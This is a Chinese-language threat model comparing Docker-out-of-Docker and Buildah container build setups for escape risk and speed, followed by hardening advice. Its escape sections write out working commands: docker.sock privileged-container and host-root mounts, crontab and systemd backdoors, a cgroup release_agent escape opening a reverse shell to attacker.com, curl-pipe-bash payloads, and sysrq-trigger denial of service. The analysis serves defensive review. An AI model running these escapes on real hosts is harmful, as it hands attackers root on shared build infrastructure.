# 容器化构建方案：安全性与性能对比分析

## 1. 背景与威胁模型

### 1.1 场景概述

本文分析三种容器化构建方案，它们作为 Web 应用的后端服务部署 —— Web 应用接收用户请求后，在后端容器中执行镜像构建任务（`docker build` / `buildah bud`），产出容器镜像。

源文档 `containerized-build.md` 记录了三种方案的实现方式与性能数据。本文在此基础上，从攻击链视角逐一分析每种方案的容器逃逸路径，并给出安全建议。

### 1.2 威胁模型

**攻击者能力假设（由浅入深三个递进阶段）：**

| 阶段 | 攻击者已获得的能力 | 典型达成方式 |
|------|-------------------|-------------|
| **阶段一：Web 入口失陷** | Web 应用容器的 shell，以构建容器的普通用户身份执行命令 | Web RCE（反序列化、模板注入、命令注入）、SSRF → 容器内执行 |
| **阶段二：构建任务投毒** | 可控制或篡改构建输入（Dockerfile、构建上下文、基础镜像） | 阶段一发现构建接口后，注入恶意指令或文件 |
| **阶段三：容器逃逸** | 利用构建容器的特权配置突破容器隔离，获得宿主机控制权 | 利用各方案暴露的特权执行逃逸技术 |

**分析边界：**
- 聚焦容器逃逸（从容器内获得宿主机代码执行或 root 权限）
- 逃逸后的横向移动与持久化简要覆盖，不做独立分析
- 假设宿主机运行标准 Linux 内核（5.x/6.x），未额外配置安全模块（SELinux 除外，openEuler 默认启用）

### 1.3 三种方案概览

| 方案 | 核心机制 | 所需特权 | 性能（构建耗时） | 镜像体积 |
|------|---------|---------|-----------------|---------|
| Docker-out-of-Docker | 挂载宿主机 docker 二进制和 `docker.sock`，容器用户加入 docker 组 | docker.sock 访问权限 | 11.07s | 45.1kB (virtual 459MB) |
| Buildah + vfs | buildah 配合 vfs 存储引擎，无需 Docker daemon | `SYS_ADMIN` + seccomp/apparmor/systempaths=unconfined | 22.3s | 573MB (virtual 1.03GB) |
| Buildah + overlay | buildah 配合 overlay 存储引擎，额外需要 FUSE | vfs 全部特权 + `/dev/fuse` 设备 | 18.3s | 192MB (virtual 650MB) |

---

## 2. Docker-out-of-Docker 方案

### 2.1 方案回顾

```bash
docker run --rm -it \
  -v /usr/bin/docker:/usr/bin/docker \
  -v /run/docker.sock:/run/docker.sock \
  -v $(pwd):/home/testuser/work \
  docker:1.0 /bin/bash -c "..."
```

特权清单：
- 宿主机 Docker 二进制文件（只读挂载）
- 宿主机 Docker Unix Socket（读写，`/run/docker.sock`）
- 容器内用户加入 `docker` 组（GID 与宿主机 docker 组一致）
- **不需要** `--privileged`、`--cap-add`、seccomp/apparmor 放松

### 2.2 阶段一：Web 入口失陷后的攻击面

攻击者在 Web 容器中以 `testuser` 身份获得 shell。此时可直接探测到的攻击面：

```
# 探测 docker.sock 是否可用
$ curl --unix-socket /run/docker.sock http://localhost/version
{"Version":"24.0.7",...}

# 列出所有容器（包括宿主机上其他容器）
$ docker ps -a

# 列出所有镜像
$ docker images

# 查看宿主机网络
$ docker network ls
```

**关键发现：** 无需任何提权，普通用户即可通过 `docker.sock` 与 Docker daemon 通信，而 Docker daemon 以 root 运行在宿主机上。这等效于**无限制的 root 访问**。

### 2.3 阶段二：构建任务投毒

攻击者控制构建输入后，可构造恶意 Dockerfile 实现逃逸。最直接的路径是通过 `docker build` 或 `docker run` 启动一个特权容器。

**恶意 Dockerfile 示例（镜像投毒）：**

```dockerfile
FROM openeuler/openeuler:24.03
# 构建阶段即可执行任意命令，因为在 docker build 过程中
# 每个 RUN 指令都在宿主机 Docker daemon 上下文中执行
RUN curl http://attacker.com/backdoor -o /tmp/backdoor && chmod +x /tmp/backdoor
```

但 `docker build` 的 RUN 指令本身在隔离的构建容器中执行，直接逃逸受限于默认的安全配置。真正的逃逸入口在**可以自由执行 `docker run`**。

### 2.4 阶段三：docker.sock 容器逃逸

`docker.sock` 是 Docker daemon 的 Unix socket，Docker daemon 以 root 运行在宿主机上。通过 socket 发送的任何指令都以宿主机 root 身份执行。以下逐一分析具体的逃逸技术。

#### 2.4.1 启动特权容器（最直接路径）

```bash
# 以 --privileged 模式启动一个新容器，挂载宿主机根文件系统
docker run -it --rm --privileged \
  -v /:/host \
  openeuler/openeuler:24.03 \
  chroot /host /bin/bash
```

`--privileged` 关闭所有内核安全限制（禁用 seccomp、apparmor、SELinux 标签、device cgroup、capabilities 限制），并挂载宿主机 `/` 到容器内 `/host`。通过 `chroot /host` 即可获得宿主机 root shell。

**后果：** 攻击者完全控制宿主机 —— 读取所有数据、植入持久化后门、横向移动到同主机其他容器、窃取 Kubernetes secrets（若在 K8s 环境中）。

#### 2.4.2 挂载宿主机根文件系统（不需要 --privileged）

```bash
# 不需要 --privileged，仅挂载宿主机根目录
docker run -it --rm \
  -v /:/host \
  openeuler/openeuler:24.03 \
  chroot /host /bin/bash
```

`-v /:/host` 将宿主机根文件系统挂载到容器内，攻击者通过 `chroot` 获得宿主机 root 文件系统访问。可以直接写入 `/root/.ssh/authorized_keys`、修改 `/etc/crontab`、替换系统二进制文件。

#### 2.4.3 使用宿主机 PID 命名空间

```bash
# 加入宿主机 PID 命名空间，看到所有进程
docker run -it --rm --pid=host \
  openeuler/openeuler:24.03 /bin/bash

# 在容器内可以看到宿主机所有进程
# nsenter 可进入任意进程的命名空间
nsenter -t 1 -m -u -i -n -p -- /bin/bash  # 进入宿主机的 init 进程命名空间
```

`--pid=host` 使容器使用宿主机 PID 命名空间，可以看到宿主机所有进程。结合 `nsenter`（需要 `nsenter` 工具且宿主机 `/proc` 可见），可进入宿主机进程的命名空间，获得完全宿主机访问。

#### 2.4.4 写入宿主机 crontab / systemd unit（持久化）

```bash
# 方式一：挂载宿主机 /etc，写入 crontab
docker run --rm -v /etc:/host_etc openeuler/openeuler:24.03 \
  /bin/bash -c 'echo "*/5 * * * * root /tmp/backdoor" >> /host_etc/crontab'

# 方式二：挂载宿主机 systemd 目录，创建恶意 service unit
docker run --rm -v /etc/systemd/system:/host_systemd openeuler/openeuler:24.03 \
  /bin/bash -c 'cat > /host_systemd/backdoor.service <<EOF
[Unit]
Description=Backdoor
[Service]
ExecStart=/tmp/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF'
```

#### 2.4.5 挂载 Docker daemon 配置文件（长期隐蔽控制）

```bash
# 修改 Docker daemon 配置，添加 insecure registry 或修改日志驱动
docker run --rm -v /etc/docker:/host_docker openeuler/openeuler:24.03 \
  /bin/bash -c '...'
```

#### 2.4.6 利用 Docker API 创建不受限容器

```bash
# 通过 docker.sock 的 REST API 创建容器，绕过 docker CLI 的某些限制
curl --unix-socket /run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "openeuler/openeuler:24.03",
    "Cmd": ["/bin/bash", "-c", "chroot /host /bin/bash"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }' \
  http://localhost/containers/create
```

直接调用 Docker API 绕过可能存在的 docker CLI 包装器或 sudo 限制。

#### 2.4.7 利用 docker build 中的 --build-arg / 构建缓存投毒

```bash
# 构建时注入恶意内容到镜像层
docker build --build-arg="CMD=curl attacker.com/backdoor|bash" -t evil:latest .
```

攻击者还可以在构建上下文中嵌入恶意文件，利用 `COPY` / `ADD` 指令写入镜像。后续通过 `docker run` 镜像时触发 payload。

#### 2.4.8 最坏后果评估

| 维度 | 评估 |
|------|------|
| 逃逸难度 | **极低** — 只需 `docker run -v /:/host`，一条命令 |
| 获得权限 | **宿主机 root** — Docker daemon 本身运行在 root 上下文 |
| 持久化能力 | **完全** — 可写 crontab、systemd unit、SSH key、替换二进制 |
| 横向移动 | **完全** — 可访问宿主机所有容器、网络、存储 |
| 检测难度 | **低** — `docker run` 会留下容器创建日志，但可伪装成正常构建活动 |
| 影响半径 | **整台宿主机** — 包括该节点上所有其他租户的容器和服务 |

---

## 3. Buildah + vfs 方案

### 3.1 方案回顾

```bash
docker run --rm -it \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  --security-opt systempaths=unconfined \
  --cap-add SYS_ADMIN \
  -v $(pwd):/home/testuser/work \
  buildah:1.0 /bin/bash -c "..."
```

特权清单：
- `CAP_SYS_ADMIN` — Linux capability，包含大量管理操作（mount、umount、swapon、setdomainname 等）
- `seccomp=unconfined` — 禁用 seccomp 系统调用过滤，允许所有系统调用（包括通常被 seccomp 阻止的 `mount`、`kexec_load`、`bpf` 等危险调用）
- `apparmor=unconfined` — 禁用 AppArmor 强制访问控制
- `systempaths=unconfined` — 禁用 `/proc`、`/sys` 等内核伪文件系统的写保护
- **不挂载** docker.sock，**不授予** `--privileged`

### 3.2 阶段一：Web 入口失陷后的攻击面

攻击者以 `testuser`（UID 非 0）身份获得 shell。此时可探测：

```
# 确认拥有的 capabilities
$ capsh --print
Current: = ... cap_sys_admin+eip

# 确认 seccomp 状态（unconfined 意味着无过滤）
$ cat /proc/self/status | grep Seccomp
Seccomp: 0    # 0 = disabled

# 查看可访问的内核接口
$ ls /proc/sysrq-trigger  # 通常被保护，此时可访问
$ ls /dev/
```

**关键发现：** `SYS_ADMIN` + 无 seccomp 过滤 = 近乎 `--privileged` 的攻击面，尤其体现在 mount 和 namespace 操作上。

### 3.3 阶段二：构建任务投毒

Buildah 方案下，攻击者控制 Dockerfile 和构建上下文的能力仍然存在，但 buildah 本身运行在用户空间（无 daemon），恶意 Dockerfile 的 RUN 指令在 buildah 创建的隔离构建容器内执行。与 Docker 方案不同，攻击者**无法通过操作 daemon 来逃逸** —— 没有等效于 "用 socket 让 daemon 启动特权容器" 的路径。

因此，阶段二的攻击重点转向：**利用构建上下文植入逃逸工具**，为阶段三做准备。

```dockerfile
FROM openeuler/openeuler:24.03
# 将逃逸工具写入镜像，构建产物携带 payload
COPY exploit /usr/local/bin/exploit
COPY mount_escape.sh /tmp/mount_escape.sh
```

### 3.4 阶段三：SYS_ADMIN 容器逃逸

这是本文的核心章节。`SYS_ADMIN` 是 Linux capabilities 中权限最高的之一，结合 seccomp/apparmor/systempaths 全部关闭，攻击面极大。以下逐一分析具体的逃逸技术。

#### 3.4.1 mount 宿主机磁盘设备

`SYS_ADMIN` 授予了 `mount` 系统调用权限。seccomp=unconfined 确保 `mount` 调用不被 seccomp 过滤。攻击者可以：

```bash
# 查看宿主机块设备（/dev 包含了宿主机的设备节点）
$ fdisk -l
# 或直接探测常见磁盘设备
$ ls -la /dev/sda* /dev/nvme* /dev/vda*

# 挂载宿主机根分区
$ mkdir /tmp/host_root
$ mount /dev/sda1 /tmp/host_root

# 获得宿主机文件系统完整读写权限
$ chroot /tmp/host_root /bin/bash
```

**前置条件：** 需要构建容器挂载了宿主机的 `/dev` 目录（默认情况下 Docker 会创建受限的 `/dev`），或者攻击者能通过 `mknod` 创建设备节点（需要 `SYS_ADMIN` 且 seccomp 允许 `mknod`）。

若构建容器未挂载宿主机 `/dev`，攻击者可通过 `/proc/partitions` 发现设备号，然后用 `mknod` 创建设备节点：

```bash
$ cat /proc/partitions  # 列出宿主机所有块设备
$ mknod /tmp/sda1 b 8 1  # 手工创建 sda1 设备节点
$ mount /tmp/sda1 /tmp/host_root
```

**防御旁路分析：**
- AppArmor 通常阻止 mount 操作 → **已关闭**（`apparmor=unconfined`）
- Seccomp 通常阻止 mount → **已关闭**（`seccomp=unconfined`）
- SELinux 可能阻止 → openEuler 默认启用 SELinux，但 `SYS_ADMIN` 可尝试通过 `setenforce 0` 关闭（需要进一步条件）或使用 `chcon` 修改上下文

#### 3.4.2 Cgroup release_agent 逃逸

这是经典的容器逃逸技术，在关闭 seccomp 且拥有 `SYS_ADMIN` 时近乎 100% 可行。

**原理：** Linux cgroup v1 的 `release_agent` 机制允许在 cgroup 中最后一个进程退出时执行一个指定的程序。通过在容器内创建新的 cgroup、操纵 `release_agent` 文件（需要 `SYS_ADMIN`）、触发进程退出，即可在宿主机上下文中执行任意命令。

**攻击步骤：**

```bash
# 1. 创建新的 cgroup（需要 cgroup 子系统可写）
mkdir /tmp/cgrp

# 2. 挂载 cgroup 文件系统（需要 SYS_ADMIN + seccomp=unconfined）
mount -t cgroup -o memory cgroup /tmp/cgrp

# 3. 创建子 cgroup
mkdir /tmp/cgrp/x

# 4. 设置 release_agent（指向宿主机上的脚本）
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
chmod +x /cmd

# 5. 获取宿主机文件系统路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 6. 触发 release_agent 执行
echo 0 > /tmp/cgrp/x/cgroup.procs   # 将当前进程移入 cgroup
# 进程退出时，release_agent 以宿主机 root 执行 /cmd
```

**关键依赖：** `SYS_ADMIN`（mount cgroup）、seccomp=unconfined（`mount` 不被过滤）、cgroup v1 可用。

**在 openEuler 上的适用性：** openEuler 24.03 默认使用 cgroup v2，上述攻击需要 cgroup v1。但 `SYS_ADMIN` + seccomp=unconfined 允许攻击者通过挂载 `-t cgroup` 来强制使用 cgroup v1（若内核编译了 v1 支持）。此外，cgroup v2 有类似的利用技术（但路径更复杂）。

#### 3.4.3 User Namespace 逃逸

`SYS_ADMIN` + seccomp=unconfined 使得攻击者可以创建新的 user namespace 并在其中获得完全的 capabilities（包括 `CAP_SYS_ADMIN`）。虽然 user namespace 本身被设计为安全的，但结合内核漏洞或特定子系统可以实现逃逸。

```bash
# 创建新的 user namespace，在其中获得 "root"
$ unshare -U -m -p -f /bin/bash

# 在新 namespace 中，攻击者拥有全部 capabilities
# 虽然这些特权主要限于当前 namespace，但结合：
# - /proc/sysrq-trigger（systempaths=unconfined 使其可写）
# - 内核 exploit
# 可能突破 namespace 限制
```

#### 3.4.4 内核模块加载

```bash
# SYS_ADMIN + seccomp=unconfined 允许 finit_module 系统调用
# 攻击者可编译恶意内核模块并加载
$ insmod /tmp/rootkit.ko
# 或
$ modprobe /tmp/rootkit.ko
```

**前置条件：** 需要宿主机内核符号和模块签名策略允许（启用 Secure Boot 或模块签名验证的系统会阻止）。

#### 3.4.5 写入 /proc/sysrq-trigger（systempaths=unconfined）

`systempaths=unconfined` 解除了 `/proc`、`/sys` 等路径的写保护。`/proc/sysrq-trigger` 是一个危险的内核接口：

```bash
# 立即重启宿主机（拒绝服务）
echo b > /proc/sysrq-trigger

# 转储内核内存（可能泄露敏感信息）
echo d > /proc/sysrq-trigger

# 同步所有文件系统后强制卸载
echo u > /proc/sysrq-trigger
```

#### 3.4.6 利用开放的系统调用（seccomp=unconfined）

seccomp=unconfined 意味着通常被阻止的几十个危险系统调用全部开放。除 `mount` 外还包括：

| 系统调用 | 潜在利用 |
|---------|---------|
| `kexec_load` / `kexec_file_load` | 加载新内核，完全替换运行中的内核 |
| `bpf` | 加载 BPF 程序，可用于网络嗅探、数据窃取、内核 hook |
| `ptrace` | 调试/修改宿主机进程 |
| `process_vm_readv` / `process_vm_writev` | 读写其他进程内存（结合 `--pid=host` 时更危险） |
| `add_key` / `request_key` | 操纵内核密钥环 |
| `perf_event_open` | 内核性能事件采样，可能泄露内核内存 |

#### 3.4.7 最坏后果评估

| 维度 | 评估 |
|------|------|
| 逃逸难度 | **中等** — 需要多步骤组合（如 cgroup release_agent），但无需额外工具 |
| 获得权限 | **宿主机 root** — 通过 mount 或 cgroup 逃逸均可达到 |
| 持久化能力 | **高** — 获得 root 后与 Docker 方案同等 |
| 横向移动 | **高** — 从宿主机可访问所有容器 |
| 检测难度 | **中等** — mount、cgroup 操作会产生审计日志 |
| 影响半径 | **整台宿主机** |

---

## 4. Buildah + overlay 方案

### 4.1 方案回顾

```bash
docker run --rm -it \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  --security-opt systempaths=unconfined \
  --cap-add SYS_ADMIN \
  --device /dev/fuse \
  -v $(pwd):/home/testuser/work \
  buildah:1.0 /bin/bash -c "..."
```

特权清单：与 vfs 方案完全相同的安全配置，**额外增加**：
- `/dev/fuse` 设备（FUSE — Filesystem in Userspace）

### 4.2 阶段一/二分析

阶段一和阶段二的攻击面与 vfs 方案基本相同。唯一新增的攻击面是 `/dev/fuse` 设备的存在：

```
$ ls -la /dev/fuse
crw-rw-rw- 1 root root 10, 229 ... /dev/fuse
```

此设备允许容器内进程创建用户空间文件系统。这对攻击者是一个额外的工具。

### 4.3 阶段三：/dev/fuse 新增的逃逸面

overlay 方案拥有 vfs 方案的全部逃逸路径（mount 设备、cgroup release_agent、内核模块等），`/dev/fuse` 额外增加了以下逃逸路径。

#### 4.3.1 FUSE 文件系统挂载攻击

`/dev/fuse` 允许攻击者挂载自定义的 FUSE 文件系统。攻击者可以编写 FUSE 守护进程，实现对文件系统操作的完全劫持：

**攻击模式：宿主机文件系统劫持**

```bash
# 1. 挂载宿主机根文件系统到 /tmp/host_root（利用 SYS_ADMIN）
mount /dev/sda1 /tmp/host_root

# 2. 创建 FUSE 文件系统，在 overlay 挂载点上层劫持文件操作
# 攻击者编写 FUSE daemon 拦截特定文件（如 /etc/shadow、SSH keys）
# 在 buildah 构建过程中，overlay 存储驱动操作可能经过 FUSE 层

# 3. 利用 FUSE 实现数据窃取
# 当其他进程访问被 FUSE 覆盖的路径时，daemon 记录/转发数据到攻击者服务器
```

#### 4.3.2 结合 overlay 存储驱动的投毒

overlay 存储引擎在构建过程中创建 overlay 挂载。`/dev/fuse` 的存在使得攻击者可以：

1. **干扰 buildah 的 overlay 层创建：** 通过 FUSE 在构建上下文目录上层创建恶意 overlay
2. **镜像层注入：** 在 buildah 写入 overlay 层时通过 FUSE 拦截并注入恶意内容

#### 4.3.3 通过 FUSE 绕过文件访问限制

```bash
# 创建 FUSE 文件系统，将受限路径镜像为可访问
# 例如：将 /proc/PID/root 通过 FUSE 暴露为可读写
# 结合 systempaths=unconfined，访问通常受保护的内核接口
```

#### 4.3.4 与 SYS_ADMIN 的协同放大

`/dev/fuse` 与 `SYS_ADMIN` 结合产生新的攻击路径：

| 攻击组合 | SYS_ADMIN | /dev/fuse | 效果 |
|---------|-----------|-----------|------|
| 挂载劫持 | mount 宿主机设备 | FUSE 层劫持 I/O | 宿主机文件操作可被透明拦截 |
| 数据窃取 | 访问所有文件系统 | FUSE daemon 外传数据 | 隐蔽窃取宿主机数据 |
| 供应链攻击 | 构建镜像的权限 | FUSE 篡改构建产物 | 构建出的镜像可携带恶意代码 |
| 拒绝服务 | 卸载宿主机文件系统 | FUSE 造成 I/O 挂死 | 宿主机服务不可用 |

#### 4.3.5 最坏后果评估

| 维度 | 评估 |
|------|------|
| 逃逸难度 | **中低** — 拥有 vfs 全部路径 + FUSE 额外通道 |
| 获得权限 | **宿主机 root** — 与 vfs 方案等价 |
| 持久化能力 | **高** — 额外可通过 FUSE 实现更隐蔽的持久化（劫持 buildah 输出） |
| 横向移动 | **高** — 供应链攻击维度：产出的镜像可在其他节点执行 |
| 检测难度 | **中低** — FUSE 操作不同于传统的 mount/cgroup 逃逸，安全监控可能遗漏 |
| 影响半径 | **整台宿主机 + 构建产物下游所有消费者** |

---

## 5. 方案对比

### 5.1 特权对比矩阵

| 特权 / 攻击面 | Docker-out-of-Docker | Buildah + vfs | Buildah + overlay |
|--------------|---------------------|---------------|-------------------|
| docker.sock（等效宿主机 root） | ✔️ | — | — |
| SYS_ADMIN | — | ✔️ | ✔️ |
| seccomp=unconfined | — | ✔️ | ✔️ |
| apparmor=unconfined | — | ✔️ | ✔️ |
| systempaths=unconfined | — | ✔️ | ✔️ |
| /dev/fuse | — | — | ✔️ |
| 容器用户身份 | docker 组成员 | 普通用户 | 普通用户 |

### 5.2 逃逸路径对比

| 逃逸技术 | Docker-out-of-Docker | Buildah + vfs | Buildah + overlay |
|---------|---------------------|---------------|-------------------|
| 启动特权容器 (`--privileged`) | ✔️ 一条命令 | — | — |
| 挂载宿主机根文件系统 (`-v /:/host`) | ✔️ 一条命令 | ✔️ mount + mknod | ✔️ mount + mknod |
| 使用宿主机 PID 命名空间 (`--pid=host`) | ✔️ 一条命令 | — | — |
| 写入宿主机 crontab/systemd | ✔️ 一条命令 | — | — |
| Cgroup release_agent 逃逸 | — | ✔️ cgroup v1 | ✔️ cgroup v1 |
| 直接 mount 宿主机磁盘设备 | — | ✔️ | ✔️ |
| 内核模块加载 | — | ✔️（需模块签名允许） | ✔️（需模块签名允许） |
| sysrq-trigger 拒绝服务 | — | ✔️ | ✔️ |
| seccomp 开放的危险系统调用 | — | ✔️ (bpf, kexec, ptrace, etc.) | ✔️ (bpf, kexec, ptrace, etc.) |
| FUSE 文件系统劫持 | — | — | ✔️ |
| 供应链攻击（镜像产物投毒） | ✔️ | — | ✔️ |

### 5.3 性能 vs 安全权衡

| 维度 | Docker-out-of-Docker | Buildah + vfs | Buildah + overlay |
|------|---------------------|---------------|-------------------|
| **构建耗时** | 11.07s ⭐ 最快 | 22.3s | 18.3s |
| **镜像体积** | 45.1kB (virtual 459MB) ⭐ 最小 | 573MB (virtual 1.03GB) | 192MB (virtual 650MB) |
| **逃逸难度** | 极低（一条命令） | 中等（多步骤） | 中低（最多路径） |
| **夺权结果** | 宿主机 root | 宿主机 root | 宿主机 root |
| **供应链风险** | 有（可篡改镜像产物） | 较低 | 有（FUSE + 构建投毒） |
| **检测难度** | 低（docker 审计日志） | 中等 | 中低（FUSE 路径可能被遗漏） |
| **安全评级** | 🔴 高风险 | 🟠 中高风险 | 🔴 高风险 |
| **性能评级** | ⭐⭐⭐ | ⭐ | ⭐⭐ |

---

## 6. 安全建议

### 6.1 通用加固措施（适用于所有方案）

无论选择哪种方案，都应在 Web 应用层实施以下措施：

1. **输入验证与白名单**
   - 对 Dockerfile 内容进行静态分析扫描，检测危险指令（`--privileged`、`-v /:/`、`--pid=host` 等）
   - 限制允许的基础镜像白名单，拒绝来自不可信 registry 的镜像
   - 扫描构建上下文中的可疑文件（SUID 二进制、内核模块、FUSE daemon）

2. **构建任务隔离**
   - 每个构建任务使用独立的临时容器，构建完成后立即销毁
   - 限制构建容器的网络访问，阻止反向 shell 和外传数据
   - 对构建接口实施严格的身份认证和授权（认证用户/服务后才可提交构建任务）

3. **审计与监控**
   - 记录所有 Docker/Buildah API 调用
   - 监控异常特权使用（`docker run --privileged` 告警）
   - 对构建产物进行镜像扫描（漏洞扫描 + 恶意文件检测）

4. **最小权限原则**
   - 所有方案都应移除不需要的 capabilities 和权限
   - 启用 seccomp 自定义 profile（仅在构建阶段需要的最小系统调用集）
   - 编写 AppArmor profile 限制文件系统和 mount 操作

### 6.2 针对 Docker-out-of-Docker 的加固

Docker-out-of-Docker 的核心风险是 `docker.sock` 提供无限制的 Docker daemon 访问。加固方向：

1. **使用 Docker socket 代理（推荐）**
   - 不直接挂载 `docker.sock`，使用 [docker-socket-proxy](https://github.com/Tecnativa/docker-socket-proxy) 等代理
   - 代理按 HTTP 方法和端点过滤 API 调用（例如只允许 `GET /images/*`、`POST /build`，拒绝 `POST /containers/create` 中的特权参数）

2. **使用 TLS 认证的 Docker daemon**
   - 不挂载 socket，改用 TLS 加密的 TCP 连接
   - 使用客户端证书限制构建容器可调用的 API

3. **限制 Docker daemon 能力**
   - Docker daemon 本身可以启用 user namespace remapping（`userns-remap`），即使攻击者控制了 daemon，其操作也被映射为非特权命名空间

4. **考虑 rootless Docker**
   - 在宿主机部署 rootless Docker daemon，消除 daemon 的 root 权限

### 6.3 针对 Buildah 方案的加固

Buildah 方案的风险来自 `SYS_ADMIN` + 关闭的安全模块。加固方向：

1. **精确化 seccomp profile（最重要）**
   - 不全局设 `seccomp=unconfined`
   - 创建自定义 seccomp profile，仅在构建阶段放行 buildah 必需的系统调用（如 `mount`、`pivot_root`、`unshare` 等）
   - 危险调用（`kexec_load`、`bpf`、`add_key`、`perf_event_open` 等）应始终保持阻止

2. **精确化 AppArmor profile**
   - 不全局设 `apparmor=unconfined`
   - 编写 Buildah 专用的 AppArmor profile，限制 mount 操作的源和目标路径

3. **细化 capabilities**
   - 不使用 `SYS_ADMIN`（权限范围过大）
   - 测试 buildah 在以下最小 capability 集下是否可运行：
     ```
     --cap-add CAP_MKNOD \
     --cap-add CAP_SETUID \
     --cap-add CAP_SETGID \
     --cap-add CAP_SYS_CHROOT \
     --cap-add CAP_NET_ADMIN (overlay 方案可能需要)
     ```
   - 如果 overlay 存储引擎可通过 rootless 模式使用，优先用 rootless（见 6.4）

4. **移除 systempaths=unconfined**
   - 测试 buildah 在默认 systempaths 保护下是否可运行
   - 如果不行，使用自定义 seccomp profile 精确放行必需的 `/proc` 操作

5. **启用 user namespace**
   - 在支持的环境中（内核 >= 5.11），Docker 运行 buildah 容器时使用 `--userns=auto`（或 `userns-remap`）
   - 即便攻击者利用 SYS_ADMIN 进行 mount，也是在 user namespace 映射的非特权 UID 上下文中

### 6.4 推荐方案与行动优先级

**短期（当前生产环境的最小化加固）：**

1. 若选择 **Docker-out-of-Docker**（性能优先）：
   - 必须引入 Docker socket 代理
   - 在 daemon 端启用 `userns-remap`
   - 构建接口输入白名单

2. 若选择 **Buildah + overlay**（安全优先但可接受性能损失）：
   - 必须编写自定义 seccomp profile，移除 kexec/bpf 等危险调用
   - 必须编写 AppArmor profile
   - 评估是否可将 `SYS_ADMIN` 替换为细粒度 capabilities

**中期（架构改进）：**

- 探索 **rootless Buildah**：在内核支持 user namespace 的宿主机上，rootless Buildah 完全不需要 `SYS_ADMIN` 和 `--privileged` 相关的任何特权
  ```bash
  # Rootless Buildah 的关键差异
  # - 不需要 SYS_ADMIN
  # - 不需要 seccomp/apparmor 放松
  # - 不需要 /dev/fuse
  # - 完全在 user namespace 中运行
  # - 使用 fuse-overlayfs 或 vfs 存储驱动
  ```
- 在 CI 环境或 K8s 集群中优先部署 rootless 构建方案

**长期（架构分离）：**

- 将构建任务调度到独立的、一次性的 VM 或 microVM（如 Firecracker、Kata Containers）
- 构建环境的特权完全隔离，即便逃逸也受限于 VM 边界
- 构建完成后 VM 立即销毁，攻击者的持久化窗口为零

### 6.5 纵深防御总结

```
第一层：Web 应用层
├── 输入验证（Dockerfile 白名单指令、基础镜像白名单）
├── 认证授权（构建接口身份验证）
└── 速率限制（阻止批量恶意构建）

第二层：构建容器层
├── 最小化特权（seccomp profile、capability 精细化、AppArmor profile）
├── Socket 代理（Docker 方案）或 rootless 模式（Buildah 方案）
└── 网络隔离（限制构建容器外连）

第三层：宿主机层
├── Docker daemon userns-remap
├── 内核安全模块（SELinux enforcing、seccomp 默认 profile）
└── 审计日志（auditd 监控 mount/cgroup/syscall 异常）

第四层：架构层
├── 一次性构建容器（用完即毁）
├── VM/microVM 级别隔离
└── 独立构建集群（与生产服务物理/网络隔离）
```

---

## 参考资料

- 源文档: `containerized-build.md`
- [Docker Socket Proxy](https://github.com/Tecnativa/docker-socket-proxy)
- [Rootless Buildah](https://github.com/containers/buildah/blob/main/docs/tutorials/01-intro.md)
- [Cgroup v1 release_agent escape technique](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Linux Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
